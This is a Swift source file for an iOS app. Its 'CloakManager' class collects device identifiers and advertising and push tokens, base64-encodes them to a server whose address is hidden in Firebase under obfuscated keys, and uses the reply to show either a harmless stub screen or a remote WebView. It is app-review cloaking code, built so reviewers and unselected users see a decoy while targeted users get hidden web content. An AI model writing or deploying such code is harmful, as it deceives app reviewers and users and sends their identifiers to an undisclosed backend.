//
//  CloakManager.swift
//  zm_distribution
//
//  Created by Cloak System
//

import Foundation
import SwiftUI
import AppsFlyerLib
import FirebaseDatabase
import FirebaseMessaging
import FirebaseInstallations
import AdServices
import UIKit
import Combine

class CloakManager: ObservableObject {
    
    static let shared = CloakManager()
    
    @Published var isLoading = true
    @Published var shouldShowWebView = false
    @Published var finalURL: String = ""
    
    // UserDefaults keys
    private let cacheKey = "cached_decision"
    private let cachedURLKey = "cached_final_url"
    
    private init() {}
    
    // MARK: - Main Entry Point
    func performCloakCheck() async {
        // Проверяем кэш
        if let cachedDecision = UserDefaults.standard.value(forKey: cacheKey) as? Bool {
            DispatchQueue.main.async {
                self.shouldShowWebView = cachedDecision
                if cachedDecision {
                    self.finalURL = UserDefaults.standard.string(forKey: self.cachedURLKey) ?? ""
                }
                self.isLoading = false
            }
            print("✅ Используем закешированное решение: \(cachedDecision ? "WebView" : "Заглушка")")
            return
        }
        
        // Если кэша нет - выполняем полную проверку
        do {
            // 1. Собираем все данные
            let deviceData = await collectDeviceData()
            
            // 2. Получаем базовую ссылку из Firebase RTDB
            let baseURLParts = try await fetchBaseURLFromFirebase()
            
            // 3. Формируем POST запрос с данными устройства
            let finalURLParts = try await sendPostRequest(baseURLParts: baseURLParts, deviceData: deviceData)
            
            // 4. Обрабатываем результат
            processResult(finalURLParts)
            
        } catch {
            print("❌ Ошибка клоаки: \(error.localizedDescription)")
            // В случае ошибки показываем заглушку
            DispatchQueue.main.async {
                self.shouldShowWebView = false
                self.isLoading = false
                UserDefaults.standard.set(false, forKey: self.cacheKey)
            }
        }
    }
    
    // MARK: - 1. Сбор данных устройства
    private func collectDeviceData() async -> [String: String] {
        var data: [String: String] = [:]
        
        // att_token - AdServices Attribution Token
        if #available(iOS 14.3, *) {
            do {
                if let token = try? AAAttribution.attributionToken() {
                    data["att_token"] = token
                    print("✅ ATT Token: \(token)")
                } else {
                    data["att_token"] = ""
                    print("⚠️ ATT Token недоступен")
                }
            }
        } else {
            data["att_token"] = ""
        }
        
        // appsflyer_id - UUID из AppsFlyer
        let appsFlyerID = AppsFlyerLib.shared().getAppsFlyerUID()
        data["appsflyer_id"] = appsFlyerID
        print("✅ AppsFlyer ID: \(appsFlyerID)")
        
        // app_instance_id - Firebase Installation ID
        do {
            let installationID = try await Installations.installations().installationID()
            data["app_instance_id"] = installationID
            print("✅ Firebase Installation ID: \(installationID)")
        } catch {
            data["app_instance_id"] = ""
            print("❌ Ошибка получения Firebase Installation ID: \(error)")
        }
        
        // uuid - Уникальный UUID v4 устройства
        let uuid = UUID().uuidString.lowercased()
        data["uuid"] = uuid
        print("✅ Device UUID: \(uuid)")
        
        // osVersion - Версия iOS
        let osVersion = await UIDevice.current.systemVersion
        data["osVersion"] = osVersion
        print("✅ iOS Version: \(osVersion)")
        
        // devModel - Модель устройства
        var systemInfo = utsname()
        uname(&systemInfo)
        let deviceModel = withUnsafePointer(to: &systemInfo.machine) {
            $0.withMemoryRebound(to: CChar.self, capacity: 1) {
                String(cString: $0)
            }
        }
        data["devModel"] = deviceModel
        print("✅ Device Model: \(deviceModel)")
        
        // bundle - Bundle Identifier
        let bundleID = Bundle.main.bundleIdentifier ?? ""
        data["bundle"] = bundleID
        print("✅ Bundle ID: \(bundleID)")
        
        // fcm_token - Firebase Cloud Messaging Token
        do {
            let fcmToken = try await Messaging.messaging().token()
            data["fcm_token"] = fcmToken
            print("✅ FCM Token: \(fcmToken)")
        } catch {
            data["fcm_token"] = ""
            print("⚠️ FCM Token недоступен: \(error.localizedDescription)")
        }
        
        return data
    }
    
    // MARK: - 2. Получение базовой ссылки из Firebase RTDB
    private func fetchBaseURLFromFirebase() async throws -> (String, String) {
        return try await withCheckedThrowingContinuation { continuation in
            let ref = Database.database(url: DataManagers().server).reference()
            
            ref.observeSingleEvent(of: .value) { snapshot in
                guard let value = snapshot.value as? [String: Any],
                      let stray = value[DataManagers().firstKey] as? String,
                      let swap = value[DataManagers().secondKey] as? String else {
                    continuation.resume(throwing: CloakError.invalidFirebaseResponse)
                    return
                }
                
                print("✅ Firebase RTDB Response:")
                print("   stray: \(stray)")
                print("   swap: \(swap)")
                
                continuation.resume(returning: (stray, swap))
            } withCancel: { error in
                continuation.resume(throwing: error)
            }
        }
    }
    
    // MARK: - 3. POST запрос на Backend
    private func sendPostRequest(baseURLParts: (String, String), deviceData: [String: String]) async throws -> (String, String) {
        // Собираем строку для base64 кодирования
        let dataString = "appsflyer_id=\(deviceData["appsflyer_id"] ?? "")&app_instance_id=\(deviceData["app_instance_id"] ?? "")&uid=\(deviceData["uuid"] ?? "")&osVersion=\(deviceData["osVersion"] ?? "")&devModel=\(deviceData["devModel"] ?? "")&bundle=\(deviceData["bundle"] ?? "")&fcm_token=\(deviceData["fcm_token"] ?? "")&att_token=\(deviceData["att_token"] ?? "")"
        
        // Кодируем в base64
        guard let base64Data = dataString.data(using: .utf8) else {
            throw CloakError.base64EncodingFailed
        }
        let base64String = base64Data.base64EncodedString()
        
        // Собираем финальную ссылку для POST запроса
        let postURLString = "https://\(baseURLParts.0)\(baseURLParts.1)?data=\(base64String)"
        
        print("📤 POST Request URL: \(postURLString)")
        
        guard let url = URL(string: postURLString) else {
            throw CloakError.invalidURL
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.timeoutInterval = 30
        
        // Выполняем POST запрос
        let (data, response) = try await URLSession.shared.data(for: request)
        
        guard let httpResponse = response as? HTTPURLResponse else {
            throw CloakError.invalidResponse
        }
        
        print("📥 POST Response Status: \(httpResponse.statusCode)")
        
        guard httpResponse.statusCode == 200 else {
            throw CloakError.serverError(statusCode: httpResponse.statusCode)
        }
        
        // Парсим JSON ответ
        guard let json = try? JSONSerialization.jsonObject(with: data) as? [String: String],
              let more = json["begin"],
              let sea = json["time"] else {
            throw CloakError.invalidJSONResponse
        }
        
        print("✅ Backend Response:")
        print("   begin: \(more)")
        print("   time: \(sea)")
        
        return (more, sea)
    }
    
    // MARK: - 4. Обработка результата
    private func processResult(_ urlParts: (String, String)) {
        DispatchQueue.main.async {
            // Проверяем, пустые ли значения
            if urlParts.0.isEmpty || urlParts.1.isEmpty {
                // Показываем заглушку
                print("🟡 Показываем заглушку (пустые параметры)")
                self.shouldShowWebView = false
                self.finalURL = ""
                UserDefaults.standard.set(false, forKey: self.cacheKey)
            } else {
                // Собираем финальную ссылку и показываем WebView
                let finalURL = "https://\(urlParts.0)\(urlParts.1)"
                print("🟢 Показываем WebView: \(finalURL)")
                self.shouldShowWebView = true
                self.finalURL = finalURL
                UserDefaults.standard.set(true, forKey: self.cacheKey)
                UserDefaults.standard.set(finalURL, forKey: self.cachedURLKey)
            }
            
            self.isLoading = false
        }
    }
}

// MARK: - Errors
enum CloakError: Error, LocalizedError {
    case invalidFirebaseResponse
    case base64EncodingFailed
    case invalidURL
    case invalidResponse
    case serverError(statusCode: Int)
    case invalidJSONResponse
    
    var errorDescription: String? {
        switch self {
        case .invalidFirebaseResponse:
            return "Неверный формат ответа от Firebase"
        case .base64EncodingFailed:
            return "Ошибка base64 кодирования"
        case .invalidURL:
            return "Неверный формат URL"
        case .invalidResponse:
            return "Неверный формат ответа сервера"
        case .serverError(let statusCode):
            return "Ошибка сервера: \(statusCode)"
        case .invalidJSONResponse:
            return "Неверный формат JSON ответа"
        }
    }
}
